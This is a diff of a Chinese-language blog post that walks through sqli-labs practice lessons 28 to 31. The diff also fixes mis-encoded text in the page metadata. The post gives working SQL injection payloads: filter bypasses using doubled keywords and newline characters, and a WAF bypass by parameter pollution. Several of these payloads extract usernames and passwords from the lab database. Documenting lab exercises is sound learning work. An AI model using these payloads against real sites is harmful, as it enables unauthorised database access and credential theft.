@@ -19,15 +19,15 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="less28���Գ��պϵ� 1?id&#x3D;1&#x27;);%00 Ȼ��һ��Դ��Ĺ���   12345678$id&#x3D; preg_replace(&#x27;&#x2F;[\&#x2F;\*]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#x27;&#x2F;[--]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;Stri">
+    <meta name="description" content="less28测试出闭合点 1?id&#x3D;1&#x27;);%00 然后看一眼源码的过滤   12345678$id&#x3D; preg_replace(&#x27;&#x2F;[\&#x2F;\*]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#x27;&#x2F;[--]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;Strip out">
 <meta property="og:type" content="article">
 <meta property="og:title" content="note-14">
 <meta property="og:url" content="https://aidemofashi.github.io/2025/03/16/note-14/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="less28���Գ��պϵ� 1?id&#x3D;1&#x27;);%00 Ȼ��һ��Դ��Ĺ���   12345678$id&#x3D; preg_replace(&#x27;&#x2F;[\&#x2F;\*]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#x27;&#x2F;[--]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;Stri">
+<meta property="og:description" content="less28测试出闭合点 1?id&#x3D;1&#x27;);%00 然后看一眼源码的过滤   12345678$id&#x3D; preg_replace(&#x27;&#x2F;[\&#x2F;\*]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#x27;&#x2F;[--]&#x2F;&#x27;,&quot;&quot;, $id);				&#x2F;&#x2F;Strip out">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-15T16:48:04.000Z">
-<meta property="article:modified_time" content="2025-03-15T16:58:01.688Z">
+<meta property="article:modified_time" content="2025-03-15T18:03:00.421Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary_large_image">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          74 字
+          898 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          1 分钟
+          8 分钟
         
       </span>
     
@@ -276,10 +276,45 @@
             
               <div class="markdown-body">
                 
-                <h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>���Գ��պϵ�</p>
+                <h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>测试出闭合点</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=1&#x27;);%00<br></code></pre></td></tr></table></figure>
-<p>Ȼ��һ��Դ��Ĺ���  </p>
+<p>然后看一眼源码的过滤  </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);				<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);					<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    		<span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
+<p>这辉大小写绕过就没用了，<br>而且好像是这两同时出现成union select 时才会触发过滤<br>这样的话双写绕过就有点难吧<br>但是明白了原理，根据过滤机制进行绕过就ok  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=0&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,2,3;%00<br></code></pre></td></tr></table></figure>
+<p>有点奇葩，但确实能用<br>也可以选择报错注入好像(不行，没有报错)，不试了  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="hljs-string">&#x27;;%00</span><br><span class="hljs-string">?id=0&#x27;</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>Auunion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselectnion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,database(),group_concat(column_name)<span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Ainformation_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">0</span>Awhere<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aand<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(id,username,password)from%0Asecurity.users;%00</span><br></code></pre></td></tr></table></figure>
+<h1 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h1><p>看一眼源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
+<p>好像只对union select 进行了过滤</p>
+<p>payload</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">0</span>&#x27;)ununion selection <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>比上关更简单，只过了union select，其它都过滤  </p>
+<h1 id="less29-waf过滤"><a href="#less29-waf过滤" class="headerlink" title="less29 waf过滤"></a>less29 waf过滤</h1><blockquote>
+<p>从29到31关，要用到启动tomcat作为过滤服务器，确定参数安全后才交给apache服务器。只需将sqli-labs文件夹下的tomcat-files.zip解压到tomcat&#x2F;webapp&#x2F;ROOT目录下，启动tomcat&#x2F;bin下的startup.bat即可(关闭为shutdown.bat)。<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kukudeshuo/article/details/114763700">https://blog.csdn.net/kukudeshuo/article/details/114763700</a></p>
+</blockquote>
+<p>我没有跟博客去配置tomcat，但是直接用login.php来进行测试<br>好像就是同样效果，那我直接当它配置好了吧  </p>
+<p>那就是输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/sqli-labs/Less-29/login.php?id=1   //回显正常<br>/sqli-labs/Less-29/login.php?id=1&#x27;  //会转到hacked.php<br></code></pre></td></tr></table></figure>
+<p>那大概就是waf成功阻止了此次注入<br>那就要想办法绕过waf了  </p>
+<blockquote>
+<p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
+</blockquote>
+<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>login.php<span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>&#x27;<span class="hljs-operator">--+</span><br><span class="hljs-comment">//回显</span><br><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>的内容<br></code></pre></td></tr></table></figure>
+<p>直接构造</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/sqli-labs/Less<span class="hljs-number">-29</span>/login.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>成功</p>
+<h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>Web应用程序防火墙（Web Application Firewall，WAF）是一种用于保护Web应用程序的安全设备。Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。</p>
+<h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>和上一关一样有waf，但好像没有id的话就不会有回显</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-30</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">3</span>&amp;id=<span class="hljs-number">0</span>&quot;union select 1,2,3--+<br><br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<p>看了源码还差点找不到注入点😥….</p>
+<h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>waf<br>闭合点</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-31</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>&quot;) union select 1,2,3--+<br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;)<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>按原计划，sql-labs的学习就先到这，下面sql注入的学习该去做ctf真题了，不得不说sqli-labs的帮助真挺大，能打好sql注入的原理和基础</p>
+
                 
               </div>
             
